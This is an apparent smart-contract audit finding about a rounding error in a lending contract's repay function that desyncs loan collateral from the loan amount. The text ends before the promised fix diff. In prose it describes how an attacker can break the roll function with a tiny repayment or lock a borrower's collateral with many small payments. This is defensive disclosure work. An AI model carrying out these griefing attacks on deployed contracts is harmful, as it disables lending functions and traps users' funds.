# Payment function can cause desync between `collateral` and the `amount`

## Summary
The `repay` function does not calculate the amount of  `collateral` that is related to `repaid` correctly and can cause a desync between `loan.collateral` and `loan.amount`

## Vulnerability Detail
The `repay` function can be used by the borrower or anyone in the network to repay the debt to the lender gradually. However, since the collateral calculation uses division, solidity rounds down the collateral amount, making in possible for collateral and the amount to become desynced. This is more important in two cases:

* If the `loan.amount` is much more than `loan.collateral`. In other words, the collateral token is way more valuable than the loan token.
* If the decimal points in the two ERC20 tokens is implemented differently and other than 1e18

the desync between the collateral can have side effects:

* The line below in `roll` function might underflow and disable the `roll` functionality. Any attacker in the network can break this functionality by paying a small amount of the debt. However, equation `interest + 1 < loan.amount/loan.collateral` should hold true for this attack to work. This is because the minimum payment should pay the interest and be small enough to not change the collateral. In the PoC below, attacker can pay 1e-18 of the debt token and break the funcitonality since the interest rate is zero.
```solidity
uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;
```
* It can cause some of the collateral get locked inside the contract and not accessible by the owner or anyone else. The attacker can use this property and lock all the collateral of the borrower by paying all of the position in small payments. This means that anyone can default a position and the price is paying the position's debt to the lender + gas fees of the small transactions.

## Recommendation
The main problem arises from the repay function, it can be fixed by changing the repay function according to the diff shown bellow:
